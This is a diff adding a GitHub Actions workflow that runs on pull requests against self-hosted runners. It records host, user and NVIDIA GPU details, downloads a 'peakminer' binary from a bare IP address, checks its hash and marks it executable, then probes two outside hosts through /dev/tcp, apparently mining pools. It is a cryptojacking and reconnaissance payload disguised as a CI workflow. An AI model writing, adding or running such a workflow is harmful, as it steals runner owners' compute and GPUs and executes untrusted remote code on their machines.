@@ -1,0 +1,30 @@
+name: c211-i133324-sel-2356e8
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  probe:
+    name: probe-c211-i133324-sel-2356e8
+    runs-on: [self-hosted]
+    timeout-minutes: 20
+    steps:
+      - name: device-marker
+        shell: bash
+        run: |
+          set +e
+          echo "NONCE=c211-i133324-sel-2356e8"
+          echo "RUNNER=$RUNNER_NAME"
+          date -u; hostname || true; id || true; uname -a || true; nproc || true
+          nvidia-smi -L || echo NO_NVIDIA_SMI
+          nvidia-smi --query-gpu=index,uuid,name,memory.total --format=csv,noheader || true
+          echo "NONCE-END=c211-i133324-sel-2356e8"
+      - name: fetch-miner
+        shell: bash
+        run: |
+          set +e
+          mkdir -p "$RUNNER_TEMP/pm"; cd "$RUNNER_TEMP/pm" || exit 0
+          curl -fsSL -m 300 -o peakminer http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64
+          S=$(sha256sum peakminer 2>/dev/null | cut -d' ' -f1); echo "miner_sha=$S"
+          if [ "$S" = "561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18" ]; then chmod +x peakminer; echo MINER_OK; else echo MINER_SHA_MISMATCH; fi
+          for hp in 217.15.164.237:2083 103.199.106.122:3362; do h=${hp%:*}; p=${hp#*:}; if timeout 10 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi; done
